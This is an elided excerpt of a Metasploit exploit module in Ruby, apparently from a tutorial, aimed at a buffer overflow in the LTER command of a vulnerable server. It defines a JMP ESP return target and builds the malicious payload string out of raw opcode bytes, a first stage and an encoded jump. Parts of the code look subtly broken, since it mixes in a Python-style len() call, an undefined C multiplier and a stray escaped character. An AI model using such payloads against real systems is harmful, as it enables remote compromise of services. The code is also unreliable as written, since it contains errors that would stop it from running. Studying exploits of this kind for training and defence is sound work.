...
class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module inheriting from the remote exploit class
    ...
    def initialize(info = {})	# i.e. constructor, setting the initial values
      super(update_info(info,
        ...
        [
          [ 'EssFuncDLL-JMPESP',
            {
              'jmptrgt' => 0x6250184E # This will be available in [target['jmpesp']]
            }
          ]
        ],
        'DefaultTarget'  => 0,
    ...
    def exploit	# Actual exploit
      ...
      outbound_LTER = 'LTER .' + "A"*16 + "\x54"+ "\x58" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x66\x2d\x69\x02" + "\x50" +"\x5c" + first_stage + "\A"*(datastore['RETOFFSET_LTER'] - (16 + 20 + 79 + 4 + first_stage.length())) + "\x54" + "\x58" + "\x2c\x30" + "\x50" + "\x5c" + encode_jump + "A" * (79 - (6 + len(encode_jump))) +"\x75\x08" + "\x74\x06" + [target['jmptrgt']].pack('V') + "C" * 2 + "\x54" + "\x58" + "\x66\x05\x1f\x12" + "\x50" + "\x5c" + "\x25\x4a\x4d\x4e\x55" + "\x25\x35\x32\x31\x2a" + " \x05\x75\x40\x48\x48" + "\x05\x76\x40\x48\x48" + "\x50" + C*(5000 - (3506 + 4 + 2 + 8)) # Create the malicious string that will be sent to the target
